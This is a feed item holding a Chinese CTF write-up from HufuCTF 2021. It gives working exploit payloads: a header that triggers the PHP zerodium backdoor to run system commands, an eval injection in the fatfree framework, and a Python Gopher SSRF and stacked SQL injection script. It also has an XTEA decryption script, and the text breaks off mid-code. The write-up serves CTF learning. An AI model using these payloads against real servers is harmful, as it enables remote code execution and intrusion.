        <link>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</link>
        <pubDate>Sun, 04 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png" alt="Featured image of post 虎符CTF Writeup by X1cT34m" /&gt;&lt;h2 id=&#34;misc&#34;&gt;MISC&lt;/h2&gt;
&lt;h3 id=&#34;你会日志分析吗&#34;&gt;你会日志分析吗&lt;/h3&gt;
&lt;p&gt;时间注入，手撸日志得到ascii码，转换到&lt;code&gt;ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==&lt;/code&gt;，base64解密&lt;/p&gt;
&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
&lt;h3 id=&#34;签到&#34;&gt;签到&lt;/h3&gt;
&lt;p&gt;签到访问任意PHP文件，User-Agentt: zerodiumphpinfo();&lt;/p&gt;
&lt;p&gt;User-Agentt: zerodiumsystem(&amp;lsquo;cat /flag&amp;rsquo;);&lt;/p&gt;
&lt;h3 id=&#34;unsetme&#34;&gt;unsetme&lt;/h3&gt;
&lt;p&gt;看到是fatfree框架，github下载最新&lt;code&gt;fatfree-3.7.3&lt;/code&gt;源码，本地index.php改成题目给的&lt;/p&gt;
&lt;p&gt;传参后看到debug的调用栈，本地动态调试一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210403140105240.png&#34; alt=&#34;image-20210403140105240&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接在unset下断点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210403140026001.png&#34; alt=&#34;image-20210403140026001&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;跟进到&lt;code&gt;base.php&lt;/code&gt;，看到530行左右有&lt;code&gt;eval&lt;/code&gt;，因为是拼接执行所以猜测存在命令注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210403135453125.png&#34; alt=&#34;image-20210403135453125&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;虽然对引号等有转义，但是绕一下就ok，调试的时候发现主要是它对&lt;code&gt;[]&lt;/code&gt;过滤的有点问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]);&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210403135248632.png&#34; alt=&#34;image-20210403135248632&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}&lt;/p&gt;
&lt;h3 id=&#34;慢慢做管理系统&#34;&gt;“慢慢做”管理系统&lt;/h3&gt;
&lt;p&gt;第一步MD5哈希注入，密码&lt;code&gt;kydba&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第二步Gopher打admin.php，存在堆叠注入，用强网杯随便注的rename改表名能得到admin_inner的账户密码&lt;/p&gt;
&lt;p&gt;但是登陆名需要猜解，是&lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# python3&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# wh1sper&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#username = &amp;#34;1&amp;#39;;rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#username = &amp;#34;1&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#admin_inner/5fb4e07de914cfc82afb44vbaf402203d&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#我草泥马的脑瘫题&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;5fb4e07de914cfc82afb44vbaf402203&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#fake_admin/fake_passwor&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;post_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;username={}&amp;amp;password={}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;cl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;POST /flag.php HTTP/1.1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Host: 127.0.0.1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Content-Type: application/x-www-form-urlencoded
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Content-Length: {}
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Cookie: PHPSESSID=fuj95a6eo7sa84923b6eg5bie2; path=/
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{}
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;post_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# POST参数先编码一次&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gopher://127.0.0.1:80/&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Gopher数据流再编码一次&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#print(stream)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;构造Gopher数据，先打admin.php，得到Cookie之后带着Cookie打flag.php就能拿到flag。&lt;/p&gt;
&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;goencrypt&#34;&gt;GoEncrypt&lt;/h3&gt;
&lt;p&gt;输入符合正则格式的flag:flag{11111111-1111-1111-1111-111111111111}, 除了”-“的其他hex编码 ，之后分成2组 xtea,脚本&lt;/p&gt;
&lt;p&gt;抄百度就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#define uint32_t unsigned int
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;encipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num_rounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delta&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num_rounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num_rounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delta&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delta&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num_rounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num_rounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
